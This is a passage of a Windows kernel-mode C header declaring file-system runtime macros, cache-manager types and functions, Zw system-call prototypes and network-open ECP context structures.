#define FsRtlGetPerFileContextPointer(_fo) \
    (FsRtlSupportsPerFileContexts(_fo) ? \
        FsRtlGetPerStreamContextPointer(_fo)->FileContextSupportPointer : \
        NULL)

#define FsRtlSupportsPerFileContexts(_fo)                     \
    ((FsRtlGetPerStreamContextPointer(_fo) != NULL) &&        \
     (FsRtlGetPerStreamContextPointer(_fo)->Version >= FSRTL_FCB_HEADER_V1) &&  \
     (FsRtlGetPerStreamContextPointer(_fo)->FileContextSupportPointer != NULL))

#define FsRtlSetupAdvancedHeaderEx( _advhdr, _fmutx, _fctxptr )                     \
{                                                                                   \
    FsRtlSetupAdvancedHeader( _advhdr, _fmutx );                                    \
    if ((_fctxptr) != NULL) {                                                       \
        (_advhdr)->FileContextSupportPointer = (_fctxptr);                          \
    }                                                                               \
}

#define FsRtlGetPerStreamContextPointer(FO) (   \
    (PFSRTL_ADVANCED_FCB_HEADER)(FO)->FsContext \
)

#define FsRtlInitPerStreamContext(PSC, O, I, FC) ( \
    (PSC)->OwnerId = (O),                          \
    (PSC)->InstanceId = (I),                       \
    (PSC)->FreeCallback = (FC)                     \
)

#define FsRtlSupportsPerStreamContexts(FO) (                       \
    (BOOLEAN)((NULL != FsRtlGetPerStreamContextPointer(FO) &&     \
              FlagOn(FsRtlGetPerStreamContextPointer(FO)->Flags2, \
              FSRTL_FLAG2_SUPPORTS_FILTER_CONTEXTS))               \
)

#define FsRtlLookupPerStreamContext(_sc, _oid, _iid)                          \
 (((NULL != (_sc)) &&                                                         \
   FlagOn((_sc)->Flags2,FSRTL_FLAG2_SUPPORTS_FILTER_CONTEXTS) &&              \
   !IsListEmpty(&(_sc)->FilterContexts)) ?                                    \
        FsRtlLookupPerStreamContextInternal((_sc), (_oid), (_iid)) :          \
        NULL)

FORCEINLINE
VOID
NTAPI
FsRtlSetupAdvancedHeader(
  IN PVOID AdvHdr,
  IN PFAST_MUTEX FMutex )
{
  PFSRTL_ADVANCED_FCB_HEADER localAdvHdr = (PFSRTL_ADVANCED_FCB_HEADER)AdvHdr;

  localAdvHdr->Flags |= FSRTL_FLAG_ADVANCED_HEADER;
  localAdvHdr->Flags2 |= FSRTL_FLAG2_SUPPORTS_FILTER_CONTEXTS;
#if (NTDDI_VERSION >= NTDDI_VISTA)
  localAdvHdr->Version = FSRTL_FCB_HEADER_V1;
#else
  localAdvHdr->Version = FSRTL_FCB_HEADER_V0;
#endif
  InitializeListHead( &localAdvHdr->FilterContexts );
  if (FMutex != NULL) {
    localAdvHdr->FastMutex = FMutex;
  }
#if (NTDDI_VERSION >= NTDDI_VISTA)
  *((PULONG_PTR)(&localAdvHdr->PushLock)) = 0;
  localAdvHdr->FileContextSupportPointer = NULL;
#endif
}

#define FsRtlInitPerFileObjectContext(_fc, _owner, _inst)         \
           ((_fc)->OwnerId = (_owner), (_fc)->InstanceId = (_inst))

#define FsRtlCompleteRequest(IRP,STATUS) {         \
    (IRP)->IoStatus.Status = (STATUS);             \
    IoCompleteRequest( (IRP), IO_DISK_INCREMENT ); \
}
/* Common Cache Types */

#define VACB_MAPPING_GRANULARITY        (0x40000)
#define VACB_OFFSET_SHIFT               (18)

typedef struct _PUBLIC_BCB {
  CSHORT NodeTypeCode;
  CSHORT NodeByteSize;
  ULONG MappedLength;
  LARGE_INTEGER MappedFileOffset;
} PUBLIC_BCB, *PPUBLIC_BCB;

typedef struct _CC_FILE_SIZES {
  LARGE_INTEGER AllocationSize;
  LARGE_INTEGER FileSize;
  LARGE_INTEGER ValidDataLength;
} CC_FILE_SIZES, *PCC_FILE_SIZES;

typedef BOOLEAN
(NTAPI *PACQUIRE_FOR_LAZY_WRITE) (
  IN PVOID Context,
  IN BOOLEAN Wait);

typedef VOID
(NTAPI *PRELEASE_FROM_LAZY_WRITE) (
  IN PVOID Context);

typedef BOOLEAN
(NTAPI *PACQUIRE_FOR_READ_AHEAD) (
  IN PVOID Context,
  IN BOOLEAN Wait);

typedef VOID
(NTAPI *PRELEASE_FROM_READ_AHEAD) (
  IN PVOID Context);

typedef struct _CACHE_MANAGER_CALLBACKS {
  PACQUIRE_FOR_LAZY_WRITE AcquireForLazyWrite;
  PRELEASE_FROM_LAZY_WRITE ReleaseFromLazyWrite;
  PACQUIRE_FOR_READ_AHEAD AcquireForReadAhead;
  PRELEASE_FROM_READ_AHEAD ReleaseFromReadAhead;
} CACHE_MANAGER_CALLBACKS, *PCACHE_MANAGER_CALLBACKS;

typedef struct _CACHE_UNINITIALIZE_EVENT {
  struct _CACHE_UNINITIALIZE_EVENT *Next;
  KEVENT Event;
} CACHE_UNINITIALIZE_EVENT, *PCACHE_UNINITIALIZE_EVENT;

typedef VOID
(NTAPI *PDIRTY_PAGE_ROUTINE) (
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN PLARGE_INTEGER OldestLsn,
  IN PLARGE_INTEGER NewestLsn,
  IN PVOID Context1,
  IN PVOID Context2);

typedef VOID
(NTAPI *PFLUSH_TO_LSN) (
  IN PVOID LogHandle,
  IN LARGE_INTEGER Lsn);

typedef VOID
(NTAPI *PCC_POST_DEFERRED_WRITE) (
  IN PVOID Context1,
  IN PVOID Context2);

#define UNINITIALIZE_CACHE_MAPS          (1)
#define DO_NOT_RETRY_PURGE               (2)
#define DO_NOT_PURGE_DIRTY_PAGES         (0x4)

#define CC_FLUSH_AND_PURGE_NO_PURGE     (0x1)
/* Common Cache Functions */

#define CcIsFileCached(FO) (                                                         \
    ((FO)->SectionObjectPointer != NULL) &&                                          \
    (((PSECTION_OBJECT_POINTERS)(FO)->SectionObjectPointer)->SharedCacheMap != NULL) \
)

extern ULONG CcFastMdlReadWait;

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
VOID
NTAPI
CcInitializeCacheMap(
  IN PFILE_OBJECT FileObject,
  IN PCC_FILE_SIZES FileSizes,
  IN BOOLEAN PinAccess,
  IN PCACHE_MANAGER_CALLBACKS Callbacks,
  IN PVOID LazyWriteContext);

NTKERNELAPI
BOOLEAN
NTAPI
CcUninitializeCacheMap(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER TruncateSize OPTIONAL,
  IN PCACHE_UNINITIALIZE_EVENT UninitializeCompleteEvent OPTIONAL);

NTKERNELAPI
VOID
NTAPI
CcSetFileSizes(
  IN PFILE_OBJECT FileObject,
  IN PCC_FILE_SIZES FileSizes);

NTKERNELAPI
VOID
NTAPI
CcSetDirtyPageThreshold(
  IN PFILE_OBJECT FileObject,
  IN ULONG DirtyPageThreshold);

NTKERNELAPI
VOID
NTAPI
CcFlushCache(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN PLARGE_INTEGER FileOffset OPTIONAL,
  IN ULONG Length,
  OUT PIO_STATUS_BLOCK IoStatus OPTIONAL);

NTKERNELAPI
LARGE_INTEGER
NTAPI
CcGetFlushedValidData(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN BOOLEAN BcbListHeld);

NTKERNELAPI
BOOLEAN
NTAPI
CcZeroData(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER StartOffset,
  IN PLARGE_INTEGER EndOffset,
  IN BOOLEAN Wait);

NTKERNELAPI
PVOID
NTAPI
CcRemapBcb(
  IN PVOID Bcb);

NTKERNELAPI
VOID
NTAPI
CcRepinBcb(
  IN PVOID Bcb);

NTKERNELAPI
VOID
NTAPI
CcUnpinRepinnedBcb(
  IN PVOID Bcb,
  IN BOOLEAN WriteThrough,
  OUT PIO_STATUS_BLOCK IoStatus);

NTKERNELAPI
PFILE_OBJECT
NTAPI
CcGetFileObjectFromSectionPtrs(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer);

NTKERNELAPI
PFILE_OBJECT
NTAPI
CcGetFileObjectFromBcb(
  IN PVOID Bcb);

NTKERNELAPI
BOOLEAN
NTAPI
CcCanIWrite(
  IN PFILE_OBJECT FileObject,
  IN ULONG BytesToWrite,
  IN BOOLEAN Wait,
  IN BOOLEAN Retrying);

NTKERNELAPI
VOID
NTAPI
CcDeferWrite(
  IN PFILE_OBJECT FileObject,
  IN PCC_POST_DEFERRED_WRITE PostRoutine,
  IN PVOID Context1,
  IN PVOID Context2,
  IN ULONG BytesToWrite,
  IN BOOLEAN Retrying);

NTKERNELAPI
BOOLEAN
NTAPI
CcCopyRead(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  OUT PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus);

NTKERNELAPI
VOID
NTAPI
CcFastCopyRead(
  IN PFILE_OBJECT FileObject,
  IN ULONG FileOffset,
  IN ULONG Length,
  IN ULONG PageCount,
  OUT PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus);

NTKERNELAPI
BOOLEAN
NTAPI
CcCopyWrite(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN PVOID Buffer);

NTKERNELAPI
VOID
NTAPI
CcFastCopyWrite(
  IN PFILE_OBJECT FileObject,
  IN ULONG FileOffset,
  IN ULONG Length,
  IN PVOID Buffer);

NTKERNELAPI
VOID
NTAPI
CcMdlRead(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus);

NTKERNELAPI
VOID
NTAPI
CcMdlReadComplete(
  IN PFILE_OBJECT FileObject,
  IN PMDL MdlChain);

NTKERNELAPI
VOID
NTAPI
CcPrepareMdlWrite(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus);

NTKERNELAPI
VOID
NTAPI
CcMdlWriteComplete(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PMDL MdlChain);

NTKERNELAPI
VOID
NTAPI
CcScheduleReadAhead(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length);

NTKERNELAPI
NTSTATUS
NTAPI
CcWaitForCurrentLazyWriterActivity(
  VOID);

NTKERNELAPI
VOID
NTAPI
CcSetReadAheadGranularity(
  IN PFILE_OBJECT FileObject,
  IN ULONG Granularity);

NTKERNELAPI
BOOLEAN
NTAPI
CcPinRead(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG Flags,
  OUT PVOID *Bcb,
  OUT PVOID *Buffer);

NTKERNELAPI
BOOLEAN
NTAPI
CcPinMappedData(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG Flags,
  IN OUT PVOID *Bcb);

NTKERNELAPI
BOOLEAN
NTAPI
CcPreparePinWrite(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Zero,
  IN ULONG Flags,
  OUT PVOID *Bcb,
  OUT PVOID *Buffer);

NTKERNELAPI
VOID
NTAPI
CcSetDirtyPinnedData(
  IN PVOID BcbVoid,
  IN PLARGE_INTEGER Lsn OPTIONAL);

NTKERNELAPI
VOID
NTAPI
CcUnpinData(
  IN PVOID Bcb);

NTKERNELAPI
VOID
NTAPI
CcSetBcbOwnerPointer(
  IN PVOID Bcb,
  IN PVOID OwnerPointer);

NTKERNELAPI
VOID
NTAPI
CcUnpinDataForThread(
  IN PVOID Bcb,
  IN ERESOURCE_THREAD ResourceThreadId);

NTKERNELAPI
VOID
NTAPI
CcSetAdditionalCacheAttributes(
  IN PFILE_OBJECT FileObject,
  IN BOOLEAN DisableReadAhead,
  IN BOOLEAN DisableWriteBehind);

NTKERNELAPI
BOOLEAN
NTAPI
CcIsThereDirtyData(
  IN PVPB Vpb);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
VOID
NTAPI
CcMdlWriteAbort(
  IN PFILE_OBJECT FileObject,
  IN PMDL MdlChain);

NTKERNELAPI
VOID
NTAPI
CcSetLogHandleForFile(
  IN PFILE_OBJECT FileObject,
  IN PVOID LogHandle,
  IN PFLUSH_TO_LSN FlushToLsnRoutine);

NTKERNELAPI
LARGE_INTEGER
NTAPI
CcGetDirtyPages(
  IN PVOID LogHandle,
  IN PDIRTY_PAGE_ROUTINE DirtyPageRoutine,
  IN PVOID Context1,
  IN PVOID Context2);

#endif

#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
BOOLEAN
NTAPI
CcMapData(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG Flags,
  OUT PVOID *Bcb,
  OUT PVOID *Buffer);
#elif (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
BOOLEAN
NTAPI
CcMapData(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  OUT PVOID *Bcb,
  OUT PVOID *Buffer);
#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
NTSTATUS
NTAPI
CcSetFileSizesEx(
  IN PFILE_OBJECT FileObject,
  IN PCC_FILE_SIZES FileSizes);

NTKERNELAPI
PFILE_OBJECT
NTAPI
CcGetFileObjectFromSectionPtrsRef(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer);

NTKERNELAPI
VOID
NTAPI
CcSetParallelFlushFile(
  IN PFILE_OBJECT FileObject,
  IN BOOLEAN EnableParallelFlush);

NTKERNELAPI
BOOLEAN
CcIsThereDirtyDataEx(
  IN PVPB Vpb,
  IN PULONG NumberOfDirtyPages OPTIONAL);

#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)
NTKERNELAPI
VOID
NTAPI
CcCoherencyFlushAndPurgeCache(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN PLARGE_INTEGER FileOffset OPTIONAL,
  IN ULONG Length,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN ULONG Flags OPTIONAL);
#endif

#define CcGetFileSizePointer(FO) (                                     \
    ((PLARGE_INTEGER)((FO)->SectionObjectPointer->SharedCacheMap) + 1) \
)

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
BOOLEAN
NTAPI
CcPurgeCacheSection(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN PLARGE_INTEGER FileOffset OPTIONAL,
  IN ULONG Length,
  IN ULONG Flags);
#elif (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
BOOLEAN
NTAPI
CcPurgeCacheSection(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN PLARGE_INTEGER FileOffset OPTIONAL,
  IN ULONG Length,
  IN BOOLEAN UninitializeCacheMaps);
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)
NTKERNELAPI
BOOLEAN
NTAPI
CcCopyWriteWontFlush(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length);
#else
#define CcCopyWriteWontFlush(FO, FOFF, LEN) ((LEN) <= 0x10000)
#endif

#define CcReadAhead(FO, FOFF, LEN) (                \
    if ((LEN) >= 256) {                             \
        CcScheduleReadAhead((FO), (FOFF), (LEN));   \
    }                                               \
)


/******************************************************************************
 *                            ZwXxx Functions                                 *
 ******************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryEaFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length,
  IN BOOLEAN ReturnSingleEntry,
  IN PVOID EaList OPTIONAL,
  IN ULONG EaListLength,
  IN PULONG EaIndex OPTIONAL,
  IN BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetEaFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
ZwDuplicateToken(
  IN HANDLE ExistingTokenHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN BOOLEAN EffectiveOnly,
  IN TOKEN_TYPE TokenType,
  OUT PHANDLE NewTokenHandle);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryObject(
  IN HANDLE Handle OPTIONAL,
  IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
  OUT PVOID ObjectInformation OPTIONAL,
  IN ULONG ObjectInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwNotifyChangeKey(
  IN HANDLE KeyHandle,
  IN HANDLE EventHandle OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG NotifyFilter,
  IN BOOLEAN WatchSubtree,
  OUT PVOID Buffer,
  IN ULONG BufferLength,
  IN BOOLEAN Asynchronous);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateEvent(
  OUT PHANDLE EventHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN EVENT_TYPE EventType,
  IN BOOLEAN InitialState);

NTSYSAPI
NTSTATUS
NTAPI
ZwDeleteFile(
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass,
  IN BOOLEAN ReturnSingleEntry,
  IN PUNICODE_STRING FileName OPTIONAL,
  IN BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetVolumeInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID FsInformation,
  IN ULONG Length,
  IN FS_INFORMATION_CLASS FsInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
ZwFsControlFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG FsControlCode,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwDuplicateObject(
  IN HANDLE SourceProcessHandle,
  IN HANDLE SourceHandle,
  IN HANDLE TargetProcessHandle OPTIONAL,
  OUT PHANDLE TargetHandle OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN ULONG HandleAttributes,
  IN ULONG Options);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenDirectoryObject(
  OUT PHANDLE DirectoryHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
ZwAllocateVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN ULONG_PTR ZeroBits,
  IN OUT PSIZE_T RegionSize,
  IN ULONG AllocationType,
  IN ULONG Protect);

NTSYSAPI
NTSTATUS
NTAPI
ZwFreeVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN OUT PSIZE_T RegionSize,
  IN ULONG FreeType);

NTSYSAPI
NTSTATUS
NTAPI
ZwWaitForSingleObject(
  IN HANDLE Handle,
  IN BOOLEAN Alertable,
  IN PLARGE_INTEGER Timeout OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetEvent(
  IN HANDLE EventHandle,
  OUT PLONG PreviousState OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN OUT PSIZE_T RegionSize,
  OUT PIO_STATUS_BLOCK IoStatusBlock);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationToken(
  IN HANDLE TokenHandle,
  IN TOKEN_INFORMATION_CLASS TokenInformationClass,
  OUT PVOID TokenInformation,
  IN ULONG Length,
  OUT PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetSecurityObject(
  IN HANDLE Handle,
  IN SECURITY_INFORMATION SecurityInformation,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySecurityObject(
  IN HANDLE FileHandle,
  IN SECURITY_INFORMATION SecurityInformation,
  OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN ULONG Length,
  OUT PULONG ResultLength);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenProcessTokenEx(
  IN HANDLE ProcessHandle,
  IN ACCESS_MASK DesiredAccess,
  IN ULONG HandleAttributes,
  OUT PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenThreadTokenEx(
  IN HANDLE ThreadHandle,
  IN ACCESS_MASK DesiredAccess,
  IN BOOLEAN OpenAsSelf,
  IN ULONG HandleAttributes,
  OUT PHANDLE TokenHandle);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSYSAPI
NTSTATUS
NTAPI
ZwLockFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER ByteOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key,
  IN BOOLEAN FailImmediately,
  IN BOOLEAN ExclusiveLock);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnlockFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER ByteOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryQuotaInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length,
  IN BOOLEAN ReturnSingleEntry,
  IN PVOID SidList,
  IN ULONG SidListLength,
  IN PSID StartSid OPTIONAL,
  IN BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetQuotaInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID Buffer,
  IN ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushBuffersFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationToken(
  IN HANDLE TokenHandle,
  IN TOKEN_INFORMATION_CLASS TokenInformationClass,
  IN PVOID TokenInformation,
  IN ULONG TokenInformationLength);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */


/* #if !defined(_X86AMD64_)  FIXME : WHAT ?! */
#if defined(_WIN64)

C_ASSERT(sizeof(ERESOURCE) == 0x68);
C_ASSERT(FIELD_OFFSET(ERESOURCE,ActiveCount) == 0x18);
C_ASSERT(FIELD_OFFSET(ERESOURCE,Flag) == 0x1a);

#else

C_ASSERT(sizeof(ERESOURCE) == 0x38);
C_ASSERT(FIELD_OFFSET(ERESOURCE,ActiveCount) == 0x0c);
C_ASSERT(FIELD_OFFSET(ERESOURCE,Flag) == 0x0e);

#endif
/* #endif */

#if defined(_IA64_)
#if (NTDDI_VERSION >= NTDDI_WIN2K)
//DECLSPEC_DEPRECATED_DDK
NTHALAPI
ULONG
NTAPI
HalGetDmaAlignmentRequirement(
  VOID);
#endif
#endif

#if defined(_M_IX86) || defined(_M_AMD64)
#define HalGetDmaAlignmentRequirement() 1L
#endif

extern NTKERNELAPI PUSHORT NlsOemLeadByteInfo;
#define NLS_OEM_LEAD_BYTE_INFO            NlsOemLeadByteInfo

#ifdef NLS_MB_CODE_PAGE_TAG
#undef NLS_MB_CODE_PAGE_TAG
#endif
#define NLS_MB_CODE_PAGE_TAG              NlsMbOemCodePageTag

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef enum _NETWORK_OPEN_LOCATION_QUALIFIER {
  NetworkOpenLocationAny,
  NetworkOpenLocationRemote,
  NetworkOpenLocationLoopback
} NETWORK_OPEN_LOCATION_QUALIFIER;

typedef enum _NETWORK_OPEN_INTEGRITY_QUALIFIER {
  NetworkOpenIntegrityAny,
  NetworkOpenIntegrityNone,
  NetworkOpenIntegritySigned,
  NetworkOpenIntegrityEncrypted,
  NetworkOpenIntegrityMaximum
} NETWORK_OPEN_INTEGRITY_QUALIFIER;

#if (NTDDI_VERSION >= NTDDI_WIN7)

#define NETWORK_OPEN_ECP_IN_FLAG_DISABLE_HANDLE_COLLAPSING 0x1
#define NETWORK_OPEN_ECP_IN_FLAG_DISABLE_HANDLE_DURABILITY 0x2
#define NETWORK_OPEN_ECP_IN_FLAG_FORCE_BUFFERED_SYNCHRONOUS_IO_HACK 0x80000000

typedef struct _NETWORK_OPEN_ECP_CONTEXT {
  USHORT Size;
  USHORT Reserved;
  _ANONYMOUS_STRUCT struct {
    struct {
      NETWORK_OPEN_LOCATION_QUALIFIER Location;
      NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
      ULONG Flags;
    } in;
    struct {
      NETWORK_OPEN_LOCATION_QUALIFIER Location;
      NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
      ULONG Flags;
    } out;
  } DUMMYSTRUCTNAME;
} NETWORK_OPEN_ECP_CONTEXT, *PNETWORK_OPEN_ECP_CONTEXT;

typedef struct _NETWORK_OPEN_ECP_CONTEXT_V0 {
  USHORT Size;
  USHORT Reserved;
  _ANONYMOUS_STRUCT struct {
    struct {
    NETWORK_OPEN_LOCATION_QUALIFIER Location;
    NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
    } in;
    struct {
      NETWORK_OPEN_LOCATION_QUALIFIER Location;
      NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
    } out;
  } DUMMYSTRUCTNAME;
} NETWORK_OPEN_ECP_CONTEXT_V0, *PNETWORK_OPEN_ECP_CONTEXT_V0;

#elif (NTDDI_VERSION >= NTDDI_VISTA)
typedef struct _NETWORK_OPEN_ECP_CONTEXT {
  USHORT Size;
  USHORT Reserved;
  _ANONYMOUS_STRUCT struct {
    struct {
      NETWORK_OPEN_LOCATION_QUALIFIER Location;
      NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
    } in;
    struct {
      NETWORK_OPEN_LOCATION_QUALIFIER Location;
      NETWORK_OPEN_INTEGRITY_QUALIFIER Integrity;
    } out;
  } DUMMYSTRUCTNAME;
} NETWORK_OPEN_ECP_CONTEXT, *PNETWORK_OPEN_ECP_CONTEXT;
#endif

DEFINE_GUID(GUID_ECP_NETWORK_OPEN_CONTEXT, 0xc584edbf, 0x00df, 0x4d28, 0xb8, 0x84, 0x35, 0xba, 0xca, 0x89, 0x11, 0xe8);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */


#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef struct _PREFETCH_OPEN_ECP_CONTEXT {
  PVOID Context;
} PREFETCH_OPEN_ECP_CONTEXT, *PPREFETCH_OPEN_ECP_CONTEXT;

DEFINE_GUID(GUID_ECP_PREFETCH_OPEN, 0xe1777b21, 0x847e, 0x4837, 0xaa, 0x45, 0x64, 0x16, 0x1d, 0x28, 0x6, 0x55);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

DEFINE_GUID (GUID_ECP_NFS_OPEN, 0xf326d30c, 0xe5f8, 0x4fe7, 0xab, 0x74, 0xf5, 0xa3, 0x19, 0x6d, 0x92, 0xdb);
DEFINE_GUID (GUID_ECP_SRV_OPEN, 0xbebfaebc, 0xaabf, 0x489d, 0x9d, 0x2c, 0xe9, 0xe3, 0x61, 0x10, 0x28, 0x53);

typedef struct sockaddr_storage *PSOCKADDR_STORAGE_NFS;

typedef struct _NFS_OPEN_ECP_CONTEXT {
  PUNICODE_STRING ExportAlias;
  PSOCKADDR_STORAGE_NFS ClientSocketAddress;
} NFS_OPEN_ECP_CONTEXT, *PNFS_OPEN_ECP_CONTEXT, **PPNFS_OPEN_ECP_CONTEXT;

typedef struct _SRV_OPEN_ECP_CONTEXT {
  PUNICODE_STRING ShareName;
  PSOCKADDR_STORAGE_NFS SocketAddress;
  BOOLEAN OplockBlockState;
  BOOLEAN OplockAppState;
  BOOLEAN OplockFinalState;
} SRV_OPEN_ECP_CONTEXT, *PSRV_OPEN_ECP_CONTEXT;

